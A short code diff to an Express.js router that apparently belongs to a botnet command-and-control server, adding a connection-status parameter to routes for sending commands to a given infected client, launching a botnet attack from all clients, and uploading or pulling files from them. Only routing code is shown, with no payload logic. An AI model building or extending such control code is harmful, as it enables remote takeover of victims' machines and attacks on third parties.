@@ -15,12 +15,12 @@ const middle=(req,res=response, next)=>{
 }
 
 
-const cmd_router = (clients, attacks_running) => {
+const cmd_router = (clients, attacks_running, status_connections) => {
     const router = Router();
 
     router.use(validate_jwt);
     
-    router.post('/cmd/:id', (req,res) => send_cmd(clients,req,res));
+    router.post('/cmd/:id', (req,res) => send_cmd(clients,req,res, status_connections));
     router.post('/cpanel/all',middle, (req,res) => botnet_attack(clients,attacks_running,req,res));
     router.post('/upload/:id', upload.single("file"), (req,res) => upload_file(clients,req,res));
     router.post('/get_files/', (req,res) => getFiles(clients,req,res));
